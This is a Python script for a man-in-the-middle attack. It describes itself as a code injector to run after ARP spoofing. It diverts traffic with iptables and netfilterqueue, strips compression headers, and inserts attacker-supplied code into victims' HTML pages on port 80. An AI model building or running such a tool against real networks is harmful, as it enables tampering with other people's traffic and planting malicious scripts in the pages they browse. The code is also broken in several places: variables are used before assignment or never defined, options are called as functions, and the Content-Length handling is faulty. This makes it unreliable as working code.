#!/usr/share/python3 

import subprocess
import scapy.all as scapy
import optparse
import netfilterqueue
import re

# This is a code injector (ARP SPOOF FIRST!!!!)
# This program will read a file containing code and then will inject it in the packet that has been flowing through the hacker's computer.

def get_arguements():        # Function to get arguements from the user

    parser = optparse.OptionParser()  
    parser.add_option("-l", "--local", help="To specify if the attack is to be tested locally on this system", dest="local_test")
    parser.add_option("-f", "--file", help="To specify the file that contains the code", dest="injection_code_file")
    
    (options, arguements) = parser.parse_args()

    if not options.injection_code_file:
        parser.error("[-] Please specify the code file to be injected")

    return options

def iptables(local):     # Function to fix the IP Tables in the Linux system 

    if local == "true":
        subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
        subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', '0'])
    else:
        subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '0'])

def set_load(packet, load):            # Function to modify the load field of the packet

    packet[scapy.Raw].load = load
    del packet[scapy.IP].len 
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def code_file(injection_code_file):             # Function to open the code file that has to be injected

    injection_code_open_file = open(injection_code_file, "r")
    injection_code = injection_code_open_file.read()
        
    return injection_code

def process_packet(packet):             # Function in which each packet will be processed

    options = get_arguements()
    injection_code_file = options.injection_code_file()    
    injection_code = code_file(injection_code_file)

    try:                    # Try to run the code
        load = scapy_packet[scapy.Raw].load.decode()    # .decode is for converting the load layer into string 
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:       # Checking for requests
                print("[+] Request")
                print(scapy_packet.show())
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:       # Checking for responses
                print("[+] Response")

                load = load.replace("</body>",injection_code + "</body>") 
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)

                if content_length_search and "text/html" in load:               # Analysing the load for Content-Type and Content-Length
                    content_length = content_length_search.group(0)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
        
            if load != scapy_packet[scapy.Raw].load:            # Setting the load only if it has actually changed
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))

    except UnicodeDecodeError:     # Except if an UnicodeDecodeError is thrown due to failure in decoding the load to string
        pass                       # pass and continue to carry on the code further

    packet.accept()

try:

    if options.local_test():         # Check if the user wants to test it locally or on external system
        local = "true"
    iptables(local)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run() 

except KeyboardInterrupt:            # Clearing the IPtable rules if the user inputs CTRL + C 

    print("CTRL + C detected .... clearing IP Tables")
    subprocess.call(['iptables', '--flush'])
